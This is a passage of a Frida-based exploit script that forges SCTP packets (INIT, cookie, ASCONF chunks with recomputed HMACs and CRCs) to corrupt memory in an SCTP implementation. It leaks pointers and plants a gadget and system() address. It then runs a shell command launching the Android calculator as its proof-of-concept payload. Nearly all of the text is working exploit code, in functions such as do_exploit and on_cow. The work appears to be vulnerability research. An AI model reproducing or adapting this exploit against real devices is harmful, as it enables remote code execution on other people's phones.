    hmacm(1, hkey, 32, mbuf, 4, m.add((clen + 12) - 20), 20);
    add_crc(a, clen + 12, m);
    sendpacket(transport, m, clen + 12);

    a = p;
    for (var i = 0; i < payload.length; i++) {
      p[i] = payload[i];
    }
    p[4] = vtag[0]
    p[5] = vtag[1]
    p[6] = vtag[2]
    p[7] = vtag[3]
    p[16] = (np >> 24) & 0xff
    p[17] = (np >> 16) & 0xff
    p[18] = (np >> 8) & 0xff
    p[19] = np & 0xff

    for (var i = 0; i < 1024; i++) {
      p[payload.length + i] = 0x99;
    }
    p[14] = (payload.length + 1024 - 12) >> 8;
    p[15] = (payload.length + 1024 - 12) & 0xff;

    add_crc(p, payload.length + 1024, m);
    console.log("Sending data, this could take a moment");
    sendpacket(transport, m, payload.length + 1024);

    for (var i = 0; i < 60; i++) {
      p[16] = (np >> 24) & 0xff
      p[17] = (np >> 16) & 0xff
      p[18] = (np >> 8) & 0xff
      p[19] = np & 0xff
      np++;

      p[13] = 0;
      add_crc(p, payload.length + 1024, m);
      sendpacket(transport, m, payload.length + 1024);
      Thread.sleep(0.10);
    }
    p[16] = (np >> 24) & 0xff
    p[17] = (np >> 16) & 0xff
    p[18] = (np >> 8) & 0xff
    p[19] = np & 0xff
    np++;

    p[13] = 1;
    add_crc(p, payload.length + 1024, m);
    sendpacket(transport, m, payload.length + 1024);

    for (var i = 0; i < asconf.length; i++) {

      a[i] = asconf[i]
    }

    var new_ptr = [];

    new_ptr[0] = transport_ptr[0] + 0x148
    new_ptr[1] = transport_ptr[1]
    new_ptr[2] = transport_ptr[2]
    new_ptr[3] = transport_ptr[3]
    new_ptr[4] = transport_ptr[4]

        if (new_ptr[0] > 255) {
      new_ptr[0] = new_ptr[0] - 256
      new_ptr[1] = new_ptr[1] + 1
    }
    if (new_ptr[0] > 255) {
      new_ptr[0] = new_ptr[0] - 256
      new_ptr[1] = new_ptr[1] + 1
    }
    a[4] = vtag[0]
    a[5] = vtag[1]
    a[6] = vtag[2]
    a[7] = vtag[3]
    a[0x2c] = new_ptr[3]; // id
    a[0x2d] = new_ptr[2];
    a[0x2e] = new_ptr[1];
    a[0x2f] = new_ptr[0];
    a[0x58] = new_ptr[3];
    a[0x59] = new_ptr[2];
    a[0x5a] = new_ptr[1];
    a[0x5b] = new_ptr[0];
    a[0x60] = 0;
    a[0x61] = 0;
    a[0x62] = 0;
    a[0x63] = new_ptr[4];
    for (var i = 20; i < 40; i++) {

      a[i] = 0;
    }
    var k = Memory.alloc(0x30 * 2);
    var kw = new Uint8Array(ArrayBuffer.wrap(k, 0x30 * 2));
    var fkey;
    var nkey;
    if (in_key[4] < out_key[4]) {
      fkey = in_key;
      nkey = out_key;

    } else {
      fkey = out_key;
      nkey = in_key;
    }

    for (var i = 0; i < 0x30; i++) {
      kw[i] = fkey[i]
    }
    for (var i = 0; i < 0x30; i++) {
      kw[i + 0x30] = nkey[i];
    }
    var s = ""
    for (var i = 0; i < 0x30 * 2; i++) {
      s = s + kw[i].toString(16) + " "
    }

    var vals = [];
    for (var i = 40; i < asconf.length;
         i++) { // add an extra asconf with an error to prevent free
      vals[i] = a[i];
    }
    for (var i = 40; i < asconf.length;
         i++) { // add an extra asconf with an error to prevent free
      a[i + 4] = vals[i];
    }
    a[42] = 0;
    a[43] = 4;

    hmac(1, k, 0x30 * 2, m.add(12), asconf.length - 12 + 4, m.add(20));
    add_crc(a, asconf.length + 4, m);
    sendpacket(transport, m, asconf.length + 4);
    console.log("sending asconf");

  }
}
var exploit_done = 0;

function do_exploit() {
  if (exploit_done) {
    return;
  }
  exploit_done = 1;
  var m = Memory.alloc(2000);
  var a = new Uint8Array(ArrayBuffer.wrap(m, 2000));
  var p = a;
  console.log("Starting IP setting phase");

  var np = cowbufptr[0] + (cowbufptr[1] << 8) + (cowbufptr[2] << 16) +
           (cowbufptr[3] << 24)
  np++;
  np++;
  np++;
  np++;
  np++;
  var vtemp = vtag;
  for (var i = 0; i < payload.length; i++) {
    p[i] = payload[i];
  }
  

  p[4] = vtemp[0]
  p[5] = vtemp[1]
  p[6] = vtemp[2]
  p[7] = vtemp[3]
  p[16] = (np >> 24) & 0xff
  p[17] = (np >> 16) & 0xff
  p[18] = (np >> 8) & 0xff
  p[19] = np & 0xff
  np++;
  var mb = main_buf[0] + (main_buf[1] << 8) + (main_buf[2] << 16) +
           (main_buf[3] << 24);
  for (var i = 0; i < 1024; i++) {
    if (Math.floor(i / 8) == 0x1d) {
      var o = mb + payload.length + 4 + 3 * 8;
      p[payload.length + i] = o & 0xff;
      p[payload.length + i + 1] = (o >> 8) & 0xff;
      p[payload.length + i + 2] = (o >> 16) & 0xff;
      p[payload.length + i + 3] = (o >> 24) & 0xff;
      p[payload.length + i + 4] = main_buf[4];
      p[payload.length + i + 5] = 0;
      p[payload.length + i + 6] = 0;
      p[payload.length + i + 7] = 0;
      i = i + 7;

    } else if (Math.floor(i / 8) == 0x7) {
      var o = mb + payload.length + 4 + 4 * 8;
      p[payload.length + i] = o & 0xff;
      p[payload.length + i + 1] = (o >> 8) & 0xff;
      p[payload.length + i + 2] = (o >> 16) & 0xff;
      p[payload.length + i + 3] = (o >> 24) & 0xff;
      p[payload.length + i + 4] = main_buf[4];
      p[payload.length + i + 5] = 0;
      p[payload.length + i + 6] = 0;
      p[payload.length + i + 7] = 0;
      i = i + 7;

    } else if (Math.floor(i / 8) == 0x08) {
      var gptr =
          dlopen[0] + (dlopen[1] << 8) + (dlopen[2] << 16) + (dlopen[3] << 24);
      gptr = gptr + gadget_offset;

      p[payload.length + i] = gptr & 0xff;
      p[payload.length + i + 1] = (gptr >> 8) & 0xff;
      p[payload.length + i + 2] = (gptr >> 16) & 0xff;
      p[payload.length + i + 3] = (gptr >> 24) & 0xff;
      p[payload.length + i + 4] = dlopen[4];
      p[payload.length + i + 5] = 0;
      p[payload.length + i + 6] = 0;
      p[payload.length + i + 7] = 0;
      i = i + 7;

    } else if (Math.floor(i / 8) == 0x1a) {
      var gptr =
          dlopen[0] + (dlopen[1] << 8) + (dlopen[2] << 16) + (dlopen[3] << 24);
      gptr = gptr + system_offset;
      p[payload.length + i] = gptr & 0xff;
      p[payload.length + i + 1] = (gptr >> 8) & 0xff;
      p[payload.length + i + 2] = (gptr >> 16) & 0xff;
      p[payload.length + i + 3] = (gptr >> 24) & 0xff;
      p[payload.length + i + 4] = dlopen[4];
      p[payload.length + i + 5] = 0;
      p[payload.length + i + 6] = 0;
      p[payload.length + i + 7] = 0;
      i = i + 7;

    } else if (Math.floor(i / 8) == 0x29) {
      var s =
          "am start  --user 0  -n com.google.android.calculator/com.android.calculator2.Calculator | sleep 10";
      for (var j = 0; j < s.length; j++) {
        p[payload.length + i + j] = s.charCodeAt(j);
      }
      p[payload.length + i + s.length] = 0;
      i = i + s.length;

    } else if (Math.floor(i / 8) == (0x21)) {
      var o = mb + payload.length + 4 + 37 * 8;
      p[payload.length + i] = o & 0xff;
      p[payload.length + i + 1] = (o >> 8) & 0xff;
      p[payload.length + i + 2] = (o >> 16) & 0xff;
      p[payload.length + i + 3] = (o >> 24) & 0xff;
      p[payload.length + i + 4] = main_buf[4];
      p[payload.length + i + 5] = 0;
      p[payload.length + i + 6] = 0;
      p[payload.length + i + 7] = 0;
      i = i + 7;

    } else {
      p[payload.length + i] = Math.floor(i / 8);
    }
  }
  p[14] = (payload.length + 1024 - 12) >> 8;
  p[15] = (payload.length + 1024 - 12) & 0xff;

  add_crc(p, payload.length + 1024, m);
  console.log("Sending data, this will take a few seconds");
  sendpacket(transport, m, payload.length + 1024);

  for (var i = 0; i < 60; i++) {
    p[16] = (np >> 24) & 0xff
    p[17] = (np >> 16) & 0xff
    p[18] = (np >> 8) & 0xff
    p[19] = np & 0xff
    np++;

    p[13] = 0;
    add_crc(p, payload.length + 1024, m);
    sendpacket(transport, m, payload.length + 1024);
  }

  for (var i = 0; i < cookie.length; i++) {

    a[i] = cookie[i]
  }

  p[4] = vtag[0]
  p[5] = vtag[1]
  p[6] = vtag[2]
  p[7] = vtag[3]


  p[0x84] = 0x55;
  p[0x85] = 0x77;
  p[0x86] = 0x77;
  p[0x87] = 0x88;

  for (var i = 0x94; i < cookie.length; i++) {
    p[i + 4] = cookie[i];
  }
  p[0x94] = 0xc0;
  p[0x95] = 0x07;
  p[0x96] = 0;
  p[0x97] = 4;

  var l1 = (p[0x82] << 8) + p[0x83];
  l1 = l1 + 4;
  p[0x82] = l1 >> 8;
  p[0x83] = l1 & 0xff;
  l1 = (a[14] << 8) + a[15];
  l1 = l1 + 4;
  p[0x14] = l1 >> 8;
  p[0x15] = l1 & 0xff;

  p[64] = vtag[0]
  p[65] = vtag[1]
  p[66] = vtag[2]
  p[67] = vtag[3]
     
  var clen = (a[14] << 8) + a[15];
  var mbuf = Memory.alloc(256);
  var mptr = new Uint32Array(ArrayBuffer.wrap(mbuf, 256));

  mbuf.writePointer(ptr(0));
  mbuf.add(8).writePointer(ptr(0));
  mbuf.add(16).writePointer(m.add(12));
  mbuf.add(24).writeU32(clen);
  mbuf.add(28).writeU32(clen);
  hmacm(1, hkey, 32, mbuf, 4, m.add((clen + 12) - 20), 20);
  add_crc(a, clen + 12, m);
  sendpacket(transport, m, clen + 12);

  for (var i = 0; i < cookie.length; i++) {
    a[i] = cookie[i];
  }
  a[4] = vtag[0]
  a[5] = vtag[1]
  a[6] = vtag[2]
  a[7] = vtag[3]

  a[0x40] = vtag[0]
  a[0x41] = vtag[1]
  a[0x42] = vtag[2]
  a[0x43] = vtag[3]
  a[0x58] = 0x77;
  a[0x59] = 0x77;
  a[0x5a] = 0x77;
  a[0x5b] = 0x77;
  a[0x5c] = 0x77;
  a[0x5d] = 0x77;
  a[0x5e] = 0x77;
  a[0x5f] = 0x77;
  a[0x44] = main_buf[0];
  a[0x45] = main_buf[1];
  a[0x46] = main_buf[2];
  a[0x47] = main_buf[3];
  a[0x48] = main_buf[4];
  a[0x49] = main_buf[5];
  a[0x4a] = main_buf[6];
  a[0x4b] = main_buf[7];

  a[0xdc] = 0xaa;
  a[0x84] = 0xaa;

  clen = (a[14] << 8) + a[15];
  var extra = clen + 12 - 0x80;

  clen = (a[14] << 8) + a[15] + extra;
  a[14] = clen >>> 8;
  a[15] = clen & 0xFF;

  for (var i = 0; i < extra; i++) {

    a[i + 0xf4] = cookie[i + 0x80];
  }
  mbuf = Memory.alloc(256);
  mptr = new Uint32Array(ArrayBuffer.wrap(mbuf, 256));

  mbuf.writePointer(ptr(0));
  mbuf.add(8).writePointer(ptr(0));
  mbuf.add(16).writePointer(m.add(12));
  mbuf.add(24).writeU32(clen);
  mbuf.add(28).writeU32(clen);
  hmacm(1, hkey, 32, mbuf, 4, m.add(12 + clen - 20), 20);
  add_crc(a, clen + 12, m);
  console.log("Setting pointer for exploit");
  sendpacket(transport, m, clen + 12);
}

function on_cow() {

  if (cowbufptr && need_buf) {
    need_buf = 0;
    console.log("Starting copy-on-write buffer read");
    var m = Memory.alloc(2048);
    var p = new Uint8Array(ArrayBuffer.wrap(m, 2048));
    var a = p;
    for (var i = 0; i < cookie.length; i++) {

      a[i] = cookie[i]
    }

    var np = cowbufptr;
    p[4] = vtag[0]
    p[5] = vtag[1]
    p[6] = vtag[2]
    p[7] = vtag[3]

    p[0x84] = 0x12;
    p[0x85] = 0x34;
    p[0x86] = 0x56;
    p[0x87] = 0x79;

    p[64] = vtag[0]
    p[65] = vtag[1]
    p[66] = vtag[2]
    p[67] = vtag[3]
    a[0x93] = np[0];
    a[0x92] = np[1];
    a[0x91] = np[2];
    a[0x90] = np[3];
    for (var i = 0; i < 0xd0; i++) {
      if (cookie[i] == 0x80 && cookie[i + 1] == 2) {
        for (var j = 0; j < 0x24; j++) {
          out_key[j] = cookie[i + j]
        }
      }
      if (cookie[i] == 0x80 && cookie[i + 1] == 3) {
        for (var j = 0; j < 0x6; j++) {
          out_key[j + 0x24] = cookie[i + j]
        }
      }
      if (a[i] == 0x80 && cookie[i + 1] == 4) {
        for (var j = 0; j < 0x6; j++) {
          out_key[j + 0x24 + 6] = cookie[i + j]
        }
      }
    }
    var s = "";
    for (item in out_key) {
      s = s + out_key[item].toString(16) + " "
    }

    var clen = (a[14] << 8) + a[15];
    var mbuf = Memory.alloc(256);
    var mptr = new Uint32Array(ArrayBuffer.wrap(mbuf, 256));

    mbuf.writePointer(ptr(0));
    mbuf.add(8).writePointer(ptr(0));
    mbuf.add(16).writePointer(m.add(12));
    mbuf.add(24).writeU32(clen);
    mbuf.add(28).writeU32(clen);
    hmacm(1, hkey, 32, mbuf, 4, m.add((clen + 12) - 20), 20);
    add_crc(a, clen + 12, m);
    sendpacket(transport, m, clen + 12);
    for (var i = 0; i < asconf.length; i++) {

      a[i] = asconf[i]
    }

    var new_ptr = cowbufptr;

    a[4] = vtag[0]
    a[5] = vtag[1]
    a[6] = vtag[2]
    a[7] = vtag[3]
    a[0x2c] = new_ptr[3]; // id
    a[0x2d] = new_ptr[2];
    a[0x2e] = new_ptr[1];
    a[0x2f] = new_ptr[0];
    a[0x58] = new_ptr[3];
    a[0x59] = new_ptr[2];
    a[0x5a] = new_ptr[1];
    a[0x5b] = new_ptr[0];
    a[0x60] = 0;
    a[0x61] = 0;
    a[0x62] = 0;
    a[0x63] = new_ptr[4];
    for (var i = 20; i < 40; i++) {

      a[i] = 0;
    }
    var k = Memory.alloc(0x30 * 2);
    var kw = new Uint8Array(ArrayBuffer.wrap(k, 0x30 * 2));
    var fkey;
    var nkey;
    if (in_key[4] < out_key[4]) {
      fkey = in_key;
      nkey = out_key;

    } else {
      fkey = out_key;
      nkey = in_key;
    }

    for (var i = 0; i < 0x30; i++) {
      kw[i] = fkey[i]
    }
    for (var i = 0; i < 0x30; i++) {
      kw[i + 0x30] = nkey[i];
    }
    var s = ""
    for (var i = 0; i < 0x30 * 2; i++) {
      s = s + kw[i].toString(16) + " "
    }

    var vals = [];
    for (var i = 40; i < asconf.length;
         i++) { // add an extra asconf with an error to prevent free
      vals[i] = a[i];
    }
    for (var i = 40; i < asconf.length;
         i++) { // add an extra asconf with an error to prevent free
      a[i + 4] = vals[i];
    }
    a[42] = 0;
    a[43] = 4;

    hmac(1, k, 0x30 * 2, m.add(12), asconf.length - 12 + 4, m.add(20));
    add_crc(a, asconf.length + 4, m);
    sendpacket(transport, m, asconf.length + 4);

  }
}

Interceptor.attach(sctp_out, {

  onEnter : function(args) {
    var a = new Uint8Array(ArrayBuffer.wrap(args[1], args[2].toInt32()));
    var p1 = a[0];
    var p2 = a[1];

    if ((p1 == 0x13) && (p2 == 0x88)) {
      if (!pid && a[12] == 1) {
        args[2] = ptr(0);
        return;
      }
      transport = args[0];

      if (state == 1) {

        if (count == 0 && a[12] == 1) {
          a = new Uint8Array(ArrayBuffer.wrap(args[1], init.length));
          for (var i = 0; i < init.length; i++) {

            a[i] = init[i]
          }
          args[2] = ptr(init.length);
          add_crc(a, args[2].toInt32(), args[1]);
        }
        if (count == 1) {
          if (!transport_ptr) {
            count--;
            args[2] = ptr(0);
          } else {
            for (var i = 0; i < init.length; i++) {

              a[i] = init[i]
            }

            a[31] = transport_ptr[0];
            a[30] = transport_ptr[1];
            a[29] = transport_ptr[2];
            a[28] = transport_ptr[3];

            args[2] = ptr(init.length);
            add_crc(a, args[2].toInt32(), args[1]);
          }
        } else if (count == 2) {
          var m = Memory.alloc(2000);
          var p = new Uint8Array(ArrayBuffer.wrap(m, 2000));
          for (var i = 0; i < a.length; i++) {
            p[i] = a[i];
          }
          a = p;
          if (!init_ack.length) {
            console.log("Error, no init ack");
          }
          var i = 12;
          var type = init_ack[i];
          i = i + 2
          var l = (init_ack[i] << 8) + init_ack[i + 1] var tlen = l;
          i = i + 2
          i = 20 + 16
          var ind = 0;
          while (type != 7 && l <= tlen) {

            type = (init_ack[i] << 8) + init_ack[i + 1];
            i = i + 2
            l = (init_ack[i] << 8) + init_ack[i + 1]
            i = i + 2
            ind = i
            i = i + l - 4
            if (l % 4 != 0)
            i = i + (4 - (l % 4))
          }
          a[0] = init[0];
          a[1] = init[1];
          a[2] = init[2];
          a[3] = init[3];
          a[4] = init_ack[16]
          a[5] = init_ack[17]
          a[6] = init_ack[18]
          a[7] = init_ack[19]
          a[12] = 10;
          a[13] = 0;
          a[14] = l >> 8;
          a[15] = l & 0xff;
          for (var i = 0; i < l - 4; i++) {
            a[16 + i] = init_ack[ind + i]
          }
          var ll = 12 + l;
          add_crc(a, ll, m);

          console.log(
              "Sending new cookie, this takes a few seconds, please wait");
          for (var i = 0; i < ll; i++) {
            if ((a[i] == 0x80) && (a[i + 1] == 2)) {
              need_out_key = 1;
            }
          }

          cookie = [];
          for (var i = 0; i < a.length; i++) {
            cookie[i] = a[i];
          }

          sendpacket(args[0], m, ll);
          args[2] = ptr(0);
        } else if (count == 3) {
          count++;
          if (!(transport_ptr[3] & 0x80)) {

            var m = Memory.alloc(1000);
            console.log("Fixing tsn please wait");
            var u = new Uint8Array(ArrayBuffer.wrap(m, 1000));
            u[0] = 0x13;
            u[1] = 0x88;
            u[2] = 0x13;
            u[3] = 0x88;
            u[4] = vtag[0]
            u[5] = vtag[1]
            u[6] = vtag[2]
            u[7] = vtag[3]
            u[12] = 0xc0;
            u[13] = 0
            u[14] = 0;
            u[15] = 8

            var e = transport_ptr[0] + (transport_ptr[1] << 8) +
                    (transport_ptr[2] << 16) + (transport_ptr[3] << 24)
            e++;
            var j = 0;
            for (var i = e; e < 0x80040001; e = e + 0x1ffff) {
              u[19] = e & 0xff;
              u[18] = (e >> 8) & 0xff;
              u[17] = (e >> 16) & 0xff;
              u[16] = (e >> 24) & 0xff;
              var l = 20;
              for (var q = 0; q < 10; q++) {
                u[l++] = 0xc0;
                u[l++] = 0
                u[l++] = 0;
                u[l++] = 8
                e = e + 0x1ffff;
                u[l++] = e & 0xff;
                u[l++] = (e >> 8) & 0xff;
                u[l++] = (e >> 16) & 0xff;
                u[l++] = (e >> 24) & 0xff;
              }
              add_crc(u, l, m);
              sendpacket(args[0], m, l);
              j++;
              if (j % 100 == 99) {
                console.log("working", Math.floor(e / (0x80040001 - i) * 100));
                Thread.sleep(0.25);
              }
            }
            console.log("tsn fixed");
          }

          for (var i = 0; i < asconf.length; i++) {

            a[i] = asconf[i]
          }
          a[4] = vtag[0]
          a[5] = vtag[1]
          a[6] = vtag[2]
          a[7] = vtag[3]
          a[0x2c] = transport_ptr[3]; // id
          a[0x2d] = transport_ptr[2];
          a[0x2e] = transport_ptr[1];
          a[0x2f] = transport_ptr[0];
          a[0x58] = transport_ptr[3];
          a[0x59] = transport_ptr[2];
          a[0x5a] = transport_ptr[1];
          a[0x5b] = transport_ptr[0];
          a[0x60] = 0;
          a[0x61] = 0;
          a[0x62] = 0;
          a[0x63] = transport_ptr[4];
          for (var i = 20; i < 40; i++) {

            a[i] = 0;
          }
          var k = Memory.alloc(0x30 * 2);
          var kw = new Uint8Array(ArrayBuffer.wrap(k, 0x30 * 2));
          var fkey;
          var nkey;
          if (in_key[4] < out_key[4]) {
            fkey = in_key;
            nkey = out_key;

          } else {
            fkey = out_key;
            nkey = in_key;
          }

          for (var i = 0; i < 0x30; i++) {
            kw[i] = fkey[i]
          }
          for (var i = 0; i < 0x30; i++) {
            kw[i + 0x30] = nkey[i];
          }
          var s = ""
          for (var i = 0; i < 0x30 * 2; i++) {
            s = s + kw[i].toString(16) + " "
          }

          if (need_out_key) {
            hmac(1, k, 0x30 * 2, args[1].add(12), asconf.length - 12,
                 args[1].add(20));
          } else {

            var okm = Memory.alloc(0x30);
            var ok = new Uint8Array(ArrayBuffer.wrap(okm, 0x30));
            for (var i = 0; i < 0x30; i++) {
              ok[i] = in_key[i];
            }
            hmac(1, okm, 0x30, args[1].add(12), asconf.length - 12,
                 args[1].add(20));
          }
          args[2] = ptr(asconf.length);
          add_crc(a, args[2].toInt32(), args[1]);
          /*sendpacket(args[0], args[1], args[2].toInt32());
          for(var i = 0; i < 0x30; i++){
                  ok[i] = in_key[i];
          }
          hmac(1, okm, 0x30, args[1].add(12), asconf.length - 12,
          args[1].add(20)); args[2] = ptr(asconf.length); add_crc(a,
          args[2].toInt32(), args[1]);*/
        } else if (count > 3) {

          args[2] = ptr(0);
        }
        count++;
      }
    }
  }
});
